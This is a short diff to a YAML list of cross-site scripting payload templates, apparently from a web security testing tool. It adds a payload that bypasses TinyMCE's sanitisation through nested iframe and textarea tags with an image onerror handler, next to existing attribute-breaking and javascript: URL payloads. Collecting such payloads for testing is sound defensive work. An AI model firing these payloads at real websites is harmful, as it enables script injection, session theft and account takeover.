@@ -11,3 +11,4 @@ xss_payloads:
     js_src: javascript:%2$s
     break_attribute_single_quote: ''' x=%1$s onclick=%2$s \'
     break_attribute_double_quote: '" x=%1$s onclick=%2$s \'
+    tinymce_bypass: <iframe><textarea></iframe><img src=x onerror=%2$s id=%1$s>
